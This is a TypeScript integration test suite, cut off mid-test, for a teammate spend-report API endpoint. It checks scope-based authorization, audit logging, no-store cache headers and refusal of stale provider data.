// @vitest-environment node
/*
 * GET /api/v1/reports/teammate/{id} — the auth surface of the teammate drill
 * (developer pages build W4: D31-D36, D38).
 *
 * Seeded against the KNOWN-OUTCOME company, because that fixture already
 * contains the exact C14 case the design pins on: alice's spend is $100 homed to
 * `apac.cto` and $250 homed to `apac.delivery`, personal total $350
 * (known-outcome-validation.test.ts:214-220 / :504-506). A drill opened from the
 * $100 row must head at $100 — never at $350.
 *
 * T25 TokenSheet denominators · T28 E3 shape (and its ABSENCES) · T29 the C14
 * extension · T31 the in-frame gate · T32 audit + no-store · T33 the refusal.
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import { startTestDb, stopTestDb, type TestDb } from '../helpers/db'
import { buildUsageRollup, rebuildUsageRollup } from '../helpers/usage-rollup'
import { injectTestSession } from '../../helpers/auth'
import { grantReportAccess } from '../helpers/report-access'
import {
  seedKnownOutcomeCompany,
  type KnownOutcomeIds,
} from '../helpers/known-outcome-fixture'
import { resetReportCache } from '../../../server/reporting/report-cache'
import { TEAMMATE_FRESHNESS_THRESHOLD_HOURS } from '../../../server/reporting/teammate-freshness'
import type { Session } from '../../../server/utils/auth'

import teammateReport from '../../../server/api/v1/reports/teammate/[id]/index.get'
import teammateExport from '../../../server/api/v1/reports/teammate/[id]/export.get'
import regionDrivers from '../../../server/api/v1/reports/region/drivers.get'
import ccDrill from '../../../server/api/v1/reports/cost-centres/[ccId].get'
import {
  teammateDrillTarget,
  type DrillGrants,
} from '../../../app/components/reporting/drill-contract'
import type { DriverRow } from '../../../shared/reports/types'

let t: TestDb
let ids: KnownOutcomeIds
/** A developer who OWNS apac.cto — grants: costCentre owned-or-subtree ⇒ people-scope. */
let ccOwner = ''
/** A plain developer with no ownership — grants: teammate false. */
let plainDev = ''
/*
 * mig 0129: a DEDICATED teammate for `adminSess()` — NEVER `ccOwner`. Before
 * this trap was spotted, `adminSess` was `{ ...sess(ccOwner, ...), role:
 * 'platform-admin' }` — the SAME id `ownerSess()` uses at role 'developer'.
 * report_access_grant is keyed on teammate_id alone, so granting `ccOwner`
 * 'operational' would ALSO widen `ownerSess()`'s costCentre from
 * 'owned-or-subtree' to 'all', which flips T29's "a src naming a scope the
 * caller does not hold is a 403" (apac.delivery, which the owner does NOT
 * own) into a pass — an unbounded costCentre grant admits ANY cc: frame in
 * `resolveDrillScope`. A fresh, unrelated id keeps `ownerSess()` untouched.
 */
let orgWideAdminId = ''

const MONTH = 'month=2026-05'

interface Headers {
  [k: string]: unknown
}

function ev(session: Session, query: string, params: Record<string, string>) {
  const url = '/x' + (query ? `?${query}` : '')
  const res: { _headers: Headers; statusCode: number } = { _headers: {}, statusCode: 200 }
  const e = {
    method: 'GET',
    path: url,
    context: { params },
    node: {
      req: {
        method: 'GET',
        url,
        socket: { remoteAddress: '127.0.0.1' },
        get headers() {
          return { host: 'localhost:3450', origin: 'http://localhost:3450' }
        },
      },
      res: {
        ...res,
        getHeader(k: string) {
          return res._headers[k.toLowerCase()]
        },
        setHeader(k: string, v: unknown) {
          res._headers[k.toLowerCase()] = v
        },
        removeHeader(k: string) {
          res._headers[k.toLowerCase()] = undefined
        },
        appendHeader() {},
        get headersSent() {
          return false
        },
      },
    },
  }
  injectTestSession(e as unknown as Parameters<typeof injectTestSession>[0], session)
  return { event: e as unknown as Parameters<typeof teammateReport>[0], headers: res._headers }
}

const sess = (teammateId: string, regionId: string, orgPath: string): Session =>
  ({
    teammateId,
    email: 'viewer@ko.test',
    displayName: 'Viewer',
    role: 'developer',
    regionId,
    orgPath,
    issuedAt: new Date().toISOString(),
  }) as unknown as Session

const ownerSess = () => sess(ccOwner, ids.regionApac, 'apac.cto')
/** A platform-admin — holds `across`, so the whole-company FRAME resolves. */
const adminSess = (): Session =>
  ({
    ...sess(orgWideAdminId, ids.regionApac, 'apac.cto'),
    role: 'platform-admin',
  }) as unknown as Session
const plainSess = () => sess(plainDev, ids.regionApac, 'apac.cto')

/** Call the composite; returns the parsed body + the response headers. */
async function call(session: Session, subject: string, query: string) {
  const { event, headers } = ev(session, query, { id: subject })
  const body = (await teammateReport(event)) as unknown as Record<string, unknown>
  return { body, headers }
}

async function expectForbidden(p: Promise<unknown>) {
  await expect(p).rejects.toMatchObject({ statusCode: 403 })
}

beforeAll(async () => {
  t = await startTestDb()
  // The audit write goes on a SEPARATE connection (getDb) so it survives the
  // request-tx rollback — so this suite needs the app's own pool pointed at the
  // test DB, exactly as the report-cache suite does.
  process.env.DATABASE_URL = t.url
  ids = await seedKnownOutcomeCompany(t)

  // A cost-centre OWNER of apac.cto (ownership is a relationship, not a role).
  await t.client`INSERT INTO teammate (entra_oid, email, display_name, region_id, org_unit_id, is_active)
    VALUES ('oid-ccowner', 'ccowner@ko.test', 'CC Owner', ${ids.regionApac}::uuid, ${ids.uApacCto}::uuid, true)`
  const [o] = await t.client<
    { id: string }[]
  >`SELECT id::text AS id FROM teammate WHERE email='ccowner@ko.test'`
  ccOwner = o!.id
  await t.client`INSERT INTO cou_owner (org_unit_id, teammate_id)
    VALUES (${ids.uApacCto}::uuid, ${ccOwner}::uuid)`

  await t.client`INSERT INTO teammate (entra_oid, email, display_name, region_id, org_unit_id, is_active)
    VALUES ('oid-plaindev', 'plaindev@ko.test', 'Plain Dev', ${ids.regionApac}::uuid, ${ids.uApacCto}::uuid, true)`
  const [p] = await t.client<
    { id: string }[]
  >`SELECT id::text AS id FROM teammate WHERE email='plaindev@ko.test'`
  plainDev = p!.id

  // A SEPARATE, DEDICATED teammate for `adminSess()` (mig 0129) — see the
  // `orgWideAdminId` declaration above for why it must NOT be `ccOwner`.
  // Granted BOTH permissions: 'operational' gives `across`/`regional:
  // all-regions` (what `src=across` and the region-frame tests need), and
  // there is no test in this file asserting a NARROWER scope for this
  // persona, so 'finance' costs nothing extra.
  await t.client`INSERT INTO teammate (entra_oid, email, display_name, region_id, org_unit_id, is_active)
    VALUES ('oid-orgwideadmin', 'orgwideadmin@ko.test', 'Org Wide Admin', ${ids.regionApac}::uuid, ${ids.uApacCto}::uuid, true)`
  const [a] = await t.client<
    { id: string }[]
  >`SELECT id::text AS id FROM teammate WHERE email='orgwideadmin@ko.test'`
  orgWideAdminId = a!.id
  await grantReportAccess(t.client, orgWideAdminId)
  // The region reports' §A reads come from usage_rollup_daily (usage-rollup-
  // lane.md R5/R8): materialise it from the seeds above via the real worker.
  await buildUsageRollup(t.db)
}, 180_000)

afterAll(async () => {
  await stopTestDb(t)
}, 60_000)

// ─────────────────────────────────────────────────────────────────────────────
// T29 — C14: the query carries the ENTRY SCOPE PREDICATE, never a bare id
// ─────────────────────────────────────────────────────────────────────────────

describe('T29 — the $100 row must not open a $350 page (C14)', () => {
  it('the apac.cto frame heads at 100, and 350 appears NOWHERE in the response', async () => {
    const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
    expect(body.headlineUsd).toBeCloseTo(100, 6)
    /*
     * The whole-response assertion, not just the headline: 250 of alice's month
     * homes to apac.delivery, a scope this viewer does not hold. If ANY figure
     * on the page — a TokenSheet contribution cell, a mix slice, the worklist
     * line — were computed without the scope predicate, its serialisation would
     * carry the wider number.
     */
    const json = JSON.stringify(body)
    expect(json).not.toContain('350.00')
    expect(json).not.toContain('250.00')
  })

  it('a request with NO src is a 400 — a drill with no frame IS a bare teammate_id', async () => {
    const { event } = ev(ownerSess(), MONTH, { id: ids.alice })
    await expect(teammateReport(event)).rejects.toMatchObject({ statusCode: 400 })
  })

  it('a src naming a scope the caller does not hold is a 403, never a fallback (D33)', async () => {
    // apac.delivery: this owner holds apac.cto only. A FALLBACK here would be
    // the silent reframe D33 forbids — the page would render a headline under a
    // scope word the reader never asked for.
    const { event } = ev(ownerSess(), `src=cc:${ids.uApacDelivery}&${MONTH}`, { id: ids.alice })
    await expectForbidden(teammateReport(event))
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// T25 — the TokenSheet's TWO operands (r1-H3)
// ─────────────────────────────────────────────────────────────────────────────

describe('T25 — scoped numerator, WHOLE-PROJECT denominators', () => {
  it('share is against the whole project over ALL members, so it is < 100%', async () => {
    // A viewer scoped to apac.delivery sees alice's 250 of a project whose whole
    // window total is 550 (alice 250 + bob 300).
    await t.client`INSERT INTO cou_owner (org_unit_id, teammate_id)
      VALUES (${ids.uApacDelivery}::uuid, ${ccOwner}::uuid)`
    const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacDelivery}&${MONTH}`)
    const rows = body.tokensheet as {
      project_code: string
      contribution_usd: string
      project_window_usd: string
      allocation_usd: string | null
      share_pct: number | null
    }[]
    const dx = rows.find((r) => r.project_code === 'PROJ-DELIVERYX')!
    expect(Number(dx.contribution_usd)).toBeCloseTo(250, 6)
    // The DENOMINATOR is unscoped: bob's 300 is in it even though this frame
    // does not name bob. A scoped denominator would render 100% here — the
    // exact error annex :536-540 describes.
    expect(Number(dx.project_window_usd)).toBeCloseTo(550, 6)
    expect(dx.share_pct).toBeCloseTo(250 / 550, 4)
    expect(dx.share_pct!).toBeLessThan(1)
    // And the budget state is computed on the WHOLE project's spend vs its own
    // allocation ($1000), not on the subject's slice.
    expect(Number(dx.allocation_usd)).toBeCloseTo(1000, 6)
    await t.client`DELETE FROM cou_owner WHERE org_unit_id = ${ids.uApacDelivery}::uuid`
  })

  it('the subject-scoped numerator still excludes rows homed outside the frame', async () => {
    const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
    const rows = body.tokensheet as { project_code: string; contribution_usd: string }[]
    expect(rows.map((r) => r.project_code)).toEqual(['PROJ-SCHOLARSHIP'])
    expect(Number(rows[0]!.contribution_usd)).toBeCloseTo(100, 6)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// T28 — the E3 shape, and its ABSENCES pinned rather than merely unrendered
// ─────────────────────────────────────────────────────────────────────────────

describe('T28 — E3 contribution view: what is there, and what must NOT be', () => {
  it('carries identity, tokensheet, both mixes, worklist AND the chip operands', async () => {
    const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
    expect(body.subject).toMatchObject({ id: ids.alice })
    expect(Array.isArray(body.tokensheet)).toBe(true)
    expect(Array.isArray(body.surfaceMix)).toBe(true)
    expect(Array.isArray(body.provenanceMix)).toBe(true)
    expect(body.worklistPressure).toBeDefined()
    // r1-H8: the chip row renders at reports depth from the SAME operands the me
    // pages carry — not re-derived prose.
    const meta = body.meta as { providerStates: unknown[]; coverage: unknown }
    expect(Array.isArray(meta.providerStates)).toBe(true)
    expect(meta.coverage).toBeDefined()
  })

  it('does NOT carry model, cache, insight or quota keys (ABSENT, not gapped)', async () => {
    const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
    const keys = JSON.stringify(Object.keys(body))
    for (const banned of ['model', 'cache', 'insight', 'quota', 'peer']) {
      expect(keys.toLowerCase()).not.toContain(banned)
    }
    // …and not nested either: the absence is structural, not a rendering choice.
    const json = JSON.stringify(body).toLowerCase()
    expect(json).not.toContain('"cachehit')
    expect(json).not.toContain('"quota')
    expect(json).not.toContain('"insights')
  })

  it('the identity header carries NO email field — the drill is not a directory', async () => {
    const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
    // Asserted on the SHAPE, not on a '@': this fixture's display names ARE
    // email addresses, so a character check would pass for the wrong reason.
    expect(Object.keys(body.subject as object).sort()).toEqual([
      'cost_owning_unit',
      'display_name',
      'id',
      'practice',
      'region',
    ])
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// T31 — the gate: an in-frame row ∧ is_active, each conjunct isolated
// ─────────────────────────────────────────────────────────────────────────────

describe('T31 — an in-frame row, with is_active a SEPARATE conjunct', () => {
  it('a viewer with NO people-scope grant is 403 even inside their own region', async () => {
    // A plain developer holds `regional: own-region` and nothing else; the
    // per-person governance view is not a reporting width.
    const { event } = ev(plainSess(), `src=cc:${ids.uApacCto}&${MONTH}`, { id: ids.alice })
    await expectForbidden(teammateReport(event))
  })

  it("a subject MOVED OUT is still drillable from their project's Business Unit", async () => {
    /*
     * The current-org lens (docs/design/current-org-lens/00-design.md §3.3):
     * Alice's $100 is TAGGED to proj-scholarship, whose Business Unit is
     * apac.cto, and project-tagged usage stays with the project's unit when its
     * author moves. So the apac.cto frame still holds her row after she moves to
     * apac.delivery, and the drill opens on it. (Her person-placed rows move
     * with her — tests/integration/reports/current-org-lens.test.ts.)
     */
    await t.client`UPDATE teammate SET org_unit_id = ${ids.uApacDelivery}::uuid WHERE id = ${ids.alice}::uuid`
    const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
    expect(body.headlineUsd).toBeCloseTo(100, 6)
    await t.client`UPDATE teammate SET org_unit_id = ${ids.uApacCto}::uuid WHERE id = ${ids.alice}::uuid`
  })

  it('a subject with NO in-scope rows in the window is 403 — same shape as no grant', async () => {
    // Carol is EMEA; nothing of hers homes to apac.cto.
    const { event } = ev(ownerSess(), `src=cc:${ids.uApacCto}&${MONTH}`, { id: ids.carol })
    await expectForbidden(teammateReport(event))
    // An empty WINDOW is the same answer: no existence oracle about other months.
    const { event: e2 } = ev(ownerSess(), `src=cc:${ids.uApacCto}&month=2026-01`, { id: ids.alice })
    await expectForbidden(teammateReport(e2))
  })

  it('an INACTIVE subject is 403 despite in-scope rows (is_active isolated)', async () => {
    await t.client`UPDATE teammate SET is_active = false WHERE id = ${ids.alice}::uuid`
    const { event } = ev(ownerSess(), `src=cc:${ids.uApacCto}&${MONTH}`, { id: ids.alice })
    await expectForbidden(teammateReport(event))
    await t.client`UPDATE teammate SET is_active = true WHERE id = ${ids.alice}::uuid`
    // …and the ONLY thing that changed was `is_active`: the same call now 200s.
    const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
    expect(body.headlineUsd).toBeCloseTo(100, 6)
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// T32 — the audit, and the browser cache that must never absorb it
// ─────────────────────────────────────────────────────────────────────────────

describe('T32 — read-audit on every request, and no-store on every response', () => {
  async function viewEvents(): Promise<number> {
    const [r] = await t.client<{ n: string }[]>`
      SELECT COUNT(*)::text AS n FROM audit_event
      WHERE event_type = 'report-teammate-viewed' AND subject_id = ${ids.alice}::uuid`
    return Number(r!.n)
  }

  it('TWO requests with ONE compute (server-cache hit) still write TWO audit rows', async () => {
    // Opt the response cache IN — under VITEST it defaults to disabled.
    process.env.TOKENSCOPE_REPORT_CACHE_TTL_MS = '60000'
    resetReportCache()
    try {
      const before = await viewEvents()
      const q = `src=cc:${ids.uApacCto}&${MONTH}`
      const first = await call(ownerSess(), ids.alice, q)
      const second = await call(ownerSess(), ids.alice, q)
      expect(first.body.headlineUsd).toBeCloseTo(100, 6)
      expect(second.body.headlineUsd).toBeCloseTo(100, 6)
      // The audit sits in the handler, BEFORE the cache (D35.1): a cache HIT
      // must still record who looked. Inside `compute` it would fire only for
      // the miss leader and "who viewed this person" would be TTL luck.
      expect(await viewEvents()).toBe(before + 2)
    } finally {
      delete process.env.TOKENSCOPE_REPORT_CACHE_TTL_MS
      resetReportCache()
    }
  })

  it('the PAGE response carries Cache-Control: no-store, cache enabled or not', async () => {
    const plain = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
    expect(plain.headers['cache-control']).toBe('no-store')

    process.env.TOKENSCOPE_REPORT_CACHE_TTL_MS = '60000'
    resetReportCache()
    try {
      // r1-H6: withReportCache sets `private, max-age=60` on a successful body.
      // On THIS surface that header must not survive — a browser-cache hit never
      // reaches the handler, so no audit fires and no refusal can intervene.
      const cached = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
      expect(cached.headers['cache-control']).toBe('no-store')
      expect(String(cached.headers['cache-control'])).not.toContain('max-age')
    } finally {
      delete process.env.TOKENSCOPE_REPORT_CACHE_TTL_MS
      resetReportCache()
    }
  })

  it('a real EXPORT response carries no-store and writes the EXPORT event, not the view one (r1-M1/r2-M1)', async () => {
    const [before] = await t.client<{ n: string }[]>`
      SELECT COUNT(*)::text AS n FROM audit_event
      WHERE event_type = 'report-teammate-export' AND subject_id = ${ids.alice}::uuid`
    const viewsBefore = await viewEvents()

    const { event, headers } = ev(ownerSess(), `src=cc:${ids.uApacCto}&${MONTH}`, { id: ids.alice })
    const csv = (await teammateExport(event)) as unknown as string
    expect(typeof csv).toBe('string')
    expect(csv).toContain('PROJ-SCHOLARSHIP')
    expect(headers['cache-control']).toBe('no-store')

    const [after] = await t.client<{ n: string }[]>`
      SELECT COUNT(*)::text AS n FROM audit_event
      WHERE event_type = 'report-teammate-export' AND subject_id = ${ids.alice}::uuid`
    expect(Number(after!.n)).toBe(Number(before!.n) + 1)
    // The export writes its OWN event: forensics must tell a page view from a
    // portable named-person dataset.
    expect(await viewEvents()).toBe(viewsBefore)
  })

  it('the audit payload carries IDS AND COUNTS ONLY — never a figure or a name', async () => {
    await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
    const [row] = await t.client<{ payload: Record<string, unknown>; actor: string }[]>`
      SELECT payload, actor_teammate_id::text AS actor FROM audit_event
      WHERE event_type = 'report-teammate-viewed' AND subject_id = ${ids.alice}::uuid
      ORDER BY ts_recorded DESC LIMIT 1`
    expect(row!.actor).toBe(ccOwner)
    const json = JSON.stringify(row!.payload)
    expect(json).toContain(ids.uApacCto) // the scope token — an id
    /*
     * The money check runs over the payload with UUIDs REMOVED. Searching the
     * raw JSON for '100' is a coin flip: the payload embeds ids, and a v4 uuid
     * contains that digit string often enough to fail a full suite at random —
     * this fired on `48f1100f-96cf-…`, three re-runs later it passed. A test
     * that fails on the shape of a random id is noise that trains people to
     * re-run rather than read.
     */
    const withoutIds = json.replace(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi, '<id>')
    expect(withoutIds).not.toContain('100') // no money
    expect(json).not.toContain('alice@ko.test') // no PII
    expect(json).not.toContain('PROJ-SCHOLARSHIP') // no row contents
  })

  it('an export refused for staleness is 409 and still audited — no silent empty file', async () => {
    await seedStale()
    try {
      const { event } = ev(adminSess(), `src=across&${MONTH}`, { id: ids.alice })
      await expect(teammateExport(event)).rejects.toMatchObject({ statusCode: 409 })
      const [row] = await t.client<{ payload: { refused?: boolean } }[]>`
        SELECT payload FROM audit_event
        WHERE event_type = 'report-teammate-export' AND subject_id = ${ids.alice}::uuid
        ORDER BY ts_recorded DESC LIMIT 1`
      expect(row!.payload.refused).toBe(true)
    } finally {
      await clearStale()
    }
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// T33 — the refusal: subject-scoped, stalest-decides, pre-cache
// ─────────────────────────────────────────────────────────────────────────────

/**
 * The GITHUB collection clock, at a chosen age.
 *
 * Nothing else needs seeding: the known-outcome fixture already gives alice an
 * `api-reconciled` Copilot row ($5, 2026-05-10) — a row that exists ONLY because
 * we pulled, which is exactly the kind a stale pull would misstate. What is
 * missing is the clock, so that is all this adds.
 *
 * The frame matters and is why these tests use `across`: an arm-2 row carries a
 * NULL `cost_owning_unit_id` BY CONSTRUCTION (mig 0101/0113), so a cost-centre
 * clamp cannot see one — which is itself pinned below as the
 * irrelevant-clock case.
 */
async function seedGithubClock(ageHours: number) {
  await t.client`INSERT INTO provider_usage_fact
      (source, provider, teammate_id, date, tool, cost_type, cost_usd, pulled_at)
    VALUES ('github-api', 'github', ${ids.alice}::uuid, '2026-05-10'::date, 'copilot-cli',
            'ai-credit', 5, now() - (${ageHours}::text || ' hours')::interval)`
}
async function seedStale(ageHours = 26) {
  await seedGithubClock(ageHours)
}
async function clearStale() {
  await t.client`DELETE FROM provider_usage_fact`
}

describe('T33 — the staleness refusal', () => {
  const ACROSS = `src=across&${MONTH}`

  it('an OTel-ONLY frame never refuses — arm 1 needs no provider pull to be current', async () => {
    // The cost-centre frame sees only alice's OTel rows. Refusing them because a
    // provider clock is old (or absent) would withhold figures that ARE current,
    // and would make the drill unreachable on an estate that emits but does not
    // reconcile.
    await seedStale(72)
    try {
      const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
      expect(body.refusal).toBeUndefined()
      expect(body.headlineUsd).toBeCloseTo(100, 6)
    } finally {
      await clearStale()
    }
  })

  it('a FRESH clock on a provider-fed row returns figures', async () => {
    await seedGithubClock(1)
    try {
      const { body } = await call(adminSess(), ids.alice, ACROSS)
      expect(body.refusal).toBeUndefined()
      expect(body.headlineUsd).toBeCloseTo(355, 6) // 350 OTel + 5 reconciled Copilot
    } finally {
      await clearStale()
    }
  })

  it('a stale RELEVANT provider refuses, and the FIGURES are omitted (not caveated)', async () => {
    await seedStale()
    try {
      const { body } = await call(adminSess(), ids.alice, ACROSS)
      expect(body.refusal).toMatchObject({
        reason: 'coverage-stale',
        provider: 'github',
        threshold: TEAMMATE_FRESHNESS_THRESHOLD_HOURS,
      })
      // WITHHELD, not marked: a stale figure about a named person is a
      // finding-shaped risk, so there is no figure to read at all.
      expect(body.headlineUsd).toBeUndefined()
      expect(body.tokensheet).toBeUndefined()
      expect(JSON.stringify(body)).not.toContain('100.00')
    } finally {
      await clearStale()
    }
  })

  it('MIXED providers: a FRESH anthropic clock does not mask a STALE github one (r2-H1)', async () => {
    await seedStale()
    await t.client`INSERT INTO provider_usage_fact
        (source, provider, teammate_id, date, tool, cost_type, cost_usd, pulled_at)
      VALUES ('anthropic-api', 'anthropic', ${ids.alice}::uuid, '2026-05-05'::date, 'claude-code',
              'token', 100, now())`
    try {
      const { body } = await call(adminSess(), ids.alice, ACROSS)
      expect((body.refusal as { provider: string } | undefined)?.provider).toBe('github')
    } finally {
      await clearStale()
    }
  })

  it('a stale provider ABSENT from the subject’s in-scope window does NOT refuse', async () => {
    // The SAME 72-hour github clock as the first case, under a frame whose rows
    // are all arm 1: an irrelevant clock must not gate a page it contributed
    // nothing to. Only the FRAME differs between this and the refusal above.
    await seedStale(72)
    try {
      const { body } = await call(ownerSess(), ids.alice, `src=cc:${ids.uApacCto}&${MONTH}`)
      expect(body.refusal).toBeUndefined()
      expect(body.headlineUsd).toBeCloseTo(100, 6)
    } finally {
      await clearStale()
    }
  })

  it('WARM-CACHE FLIP: a cached 200 becomes a refusal on the very NEXT request (r1-H7)', async () => {
    process.env.TOKENSCOPE_REPORT_CACHE_TTL_MS = '60000'
    resetReportCache()
    await seedGithubClock(1) // fresh github clock — the page renders
    try {
      const q = ACROSS
      const warm = await call(adminSess(), ids.alice, q)
      expect(warm.body.refusal).toBeUndefined()
      expect(warm.body.headlineUsd).toBeDefined()

      // Move the clock past the threshold. The cached body is still warm and
      // would be served for the rest of its TTL if the freshness check ran
      // inside `compute` instead of before the cache lookup.
      await t.client`UPDATE provider_usage_fact SET pulled_at = now() - interval '26 hours'
        WHERE provider = 'github'`

      const next = await call(adminSess(), ids.alice, q)
      expect(next.body.refusal).toMatchObject({ reason: 'coverage-stale', provider: 'github' })
      expect(next.body.headlineUsd).toBeUndefined()

      // …and the refusal itself is never cached: healing the clock returns
      // figures immediately rather than after the refusal's own TTL.
      await t.client`UPDATE provider_usage_fact SET pulled_at = now() WHERE provider = 'github'`
      const healed = await call(adminSess(), ids.alice, q)
      expect(healed.body.refusal).toBeUndefined()
      expect(healed.body.headlineUsd).toBeDefined()
    } finally {
      delete process.env.TOKENSCOPE_REPORT_CACHE_TTL_MS
      resetReportCache()
      await clearStale()
    }
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// r3-M3 — the freshness clock is the SUBJECT'S source, not the estate's
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Provider sources are pulled INDEPENDENTLY — one per organisation / enterprise
 * / connector. `provider_usage_fact.source` is that key, and the clock the
 * refusal reads has to be the one behind the SUBJECT's money.
 */
async function seedSource(
  teammateId: string,
  source: string,
  ageHours: number,
  day = '2026-05-10',
) {
  await t.client`INSERT INTO provider_usage_fact
      (source, provider, teammate_id, date, tool, cost_type, cost_usd, pulled_at)
    VALUES (${source}, 'github', ${teammateId}::uuid, ${day}::date, 'copilot-cli',
            'ai-credit', 5, now() - (${ageHours}::text || ' hours')::interval)`
}

describe('r3-M3 — an unrelated organisation cannot vouch for the subject', () => {
  it('a FRESH foreign source does not mask the subject’s own 26 h-old one', async () => {
    // Alice's Copilot money comes from enterprise-A, last pulled 26 h ago.
    await seedSource(ids.alice, 'copilot-consumption:enterprise-A', 26)
    // A completely different enterprise was pulled an hour ago — for BOB. Under
    // the estate-wide `MAX(pulled_at) GROUP BY provider` this made github read
    // "1 h fresh" and alice's stale named-person figures were published.
    await seedSource(ids.bob, 'copilot-consumption:enterprise-B', 1, '2026-05-11')
    try {
      const { body } = await call(adminSess(), ids.alice, `src=across&${MONTH}`)
      expect(body.refusal).toMatchObject({ reason: 'coverage-stale', provider: 'github' })
      expect(body.headlineUsd).toBeUndefined()
    } finally {
      await clearStale()
    }
  })

  it('…and the subject whose OWN source is fresh still gets figures', async () => {
    // The same two rows: the fix must not simply refuse everyone. Bob's own
    // enterprise-B clock is 1 h old, so his page renders.
    await seedSource(ids.alice, 'copilot-consumption:enterprise-A', 26)
    await seedSource(ids.bob, 'copilot-consumption:enterprise-B', 1, '2026-05-11')
    try {
      const { body } = await call(adminSess(), ids.bob, `src=across&${MONTH}`)
      expect(body.refusal).toBeUndefined()
      expect(body.headlineUsd).toBeDefined()
    } finally {
      await clearStale()
    }
  })

  it('ANY relevant source past the threshold refuses — a fresh sibling does not decide', async () => {
    // ONE subject, TWO of their own sources. The stalest decides, per source.
    await seedSource(ids.alice, 'copilot-consumption:enterprise-A', 26)
    await seedSource(ids.alice, 'copilot-consumption:enterprise-B', 1)
    try {
      const { body } = await call(adminSess(), ids.alice, `src=across&${MONTH}`)
      expect(body.refusal).toMatchObject({ reason: 'coverage-stale', provider: 'github' })
    } finally {
      await clearStale()
    }
  })
})

// ─────────────────────────────────────────────────────────────────────────────
// r3-M5 — "worklist pressure" states only the money that IS a worklist
// ─────────────────────────────────────────────────────────────────────────────

describe('r3-M5 — the no-project states are split, never one lump', () => {
  /*
   * Three dollars of no-project spend for bob inside the apac.delivery frame,
   * each in a DIFFERENT state — the exact composition the single figure used to
   * add up and label "untagged":
   *   $3 awaiting a decision · $7 already activity-tagged · $20 arm-3 untaggable
   */
  async function seedNoProjectStates() {
    const [inst] = await t.client<{ id: string }[]>`
      SELECT instance_id::text AS id FROM instance_attestation
       WHERE teammate_id = ${ids.bob}::uuid LIMIT 1`
    const ar = async (usd: number, activity: string | null, conv: string) => {
      await t.client`INSERT INTO attribution_record
          (instance_id, teammate_id, region_id, org_unit_id, cost_owning_unit_id, project_id,
           tool, model, token_type, tokens, cost_usd, fidelity_tier, cost_basis, ts_event,
           claude_session_id, activity)
        VALUES (${inst!.id}::uuid, ${ids.bob}::uuid, ${ids.regionApac}::uuid,
                ${ids.uApacDelivery}::uuid, ${ids.uApacDelivery}::uuid, NULL,
                'claude-code', 'claude-sonnet-4-6', 'input', 1000, ${usd}, 'tier-1',
                'estimated', '2026-05-12T00:00:00Z'::timestamptz, ${conv}, ${activity})`
    }
    await ar(3, null, 'r3m5-untagged')
    await ar(7, 'Research', 'r3m5-activity')
    /*
     * Arm 3 ($20): provider-reported usage on a surface that carries no session
     * and no `unaccounted_usage` row — there is nothing to attach a project or
     * an activity to, so it can never be in anybody's queue (mig 0101).
     */
    await t.client`INSERT INTO actual_spend
        (teammate_id, date, tool, input_tokens, output_tokens, cost_usd, source, chargeback_exempt)
      VALUES (${ids.bob}::uuid, '2026-05-12'::date, 'claude-ai', 0, 0, 20,
              'anthropic-analytics-api', false)`
    /*
     * …and the CLOCKS both now-relevant providers need. Arm 3 makes anthropic
     * relevant and bob's arm-2 Copilot row makes github relevant; the drill
     * refuses fail-closed on a provider it has never observed, so a fresh
     * source per provider is part of the fixture, not decoration.
     */
    await t.client`INSERT INTO provider_usage_fact
        (source, provider, teammate_id, date, tool, cost_type, cost_usd, pulled_at)
      VALUES ('anthropic-api', 'anthropic', ${ids.bob}::uuid, '2026-05-12'::date, 'claude-ai',
              'ai-credit', 20, now()),
             ('github-api', 'github', ${ids.bob}::uuid, '2026-05-11'::date, 'copilot-cli',
              'ai-credit', 10, now())`
  }
  async function clearNoProjectStates() {
    await t.client`DELETE FROM attribution_record WHERE claude_session_id LIKE 'r3m5-%'`
    await t.client`DELETE FROM actual_spend WHERE tool = 'claude-ai'`
    await t.client`DELETE FROM provider_usage_fact`
  }

  it('the worklist figure counts ONLY the money awaiting a decision', async () => {
    await seedNoProjectStates()
    try {
      const { body } = await call(adminSess(), ids.bob, `src=across&${MONTH}`)
      const w = body.worklistPressure as {
        untagged_usd: string
        untagged_days: number
        activity_tagged_usd: string
        untaggable_usd: string
      }
      /*
       * $13 — the new $3 plus bob's existing $10 arm-2 Copilot day, which is
       * genuinely taggable and genuinely untagged. NOT the $40 the single
       * figure claimed: $7 of that is a decision already made and $20 of it is
       * money the developer has no mechanism to act on at all.
       */
      expect(Number(w.untagged_usd)).toBeCloseTo(13, 6)
      expect(Number(w.activity_tagged_usd)).toBeCloseTo(7, 6)
      expect(Number(w.untaggable_usd)).toBeCloseTo(20, 6)
      // The day count describes the SAME population as the dollars beside it:
      // 05-11 (the Copilot day) and 05-12 (the new untagged row) — and NOT the
      // arm-3 or activity-tagged days, which are not queue days.
      expect(w.untagged_days).toBe(2)
    } finally {
      await clearNoProjectStates()
    }
  })

  it('the split still foots — no dollar leaves the headline by being reclassified', async () => {
    await seedNoProjectStates()
    try {
      const { body } = await call(adminSess(), ids.bob, `src=across&${MONTH}`)
      const w = body.worklistPressure as {
        untagged_usd: string
